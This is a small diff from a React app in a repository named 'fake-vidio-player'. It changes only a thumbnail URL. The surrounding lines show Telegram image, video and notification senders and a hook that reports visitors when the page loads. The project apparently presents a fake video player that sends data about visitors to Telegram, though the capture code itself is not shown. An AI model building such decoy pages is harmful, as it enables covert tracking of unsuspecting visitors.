@@ -4,7 +4,7 @@ import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } fr
 
 function App() {
   const [isBlurred] = useState(false);
-  const thumbnailUrl = 'https://raw.githubusercontent.com/zsfell/fake-vidio-player/refs/heads/main/assets/img/ss.png';
+  const thumbnailUrl = 'https://raw.githubusercontent.com/zsfell/fake-vidio-player/refs/heads/main/assets/img/ok.png';
 
   useEffect(() => {
     const sendVisitorNotification = async () => {
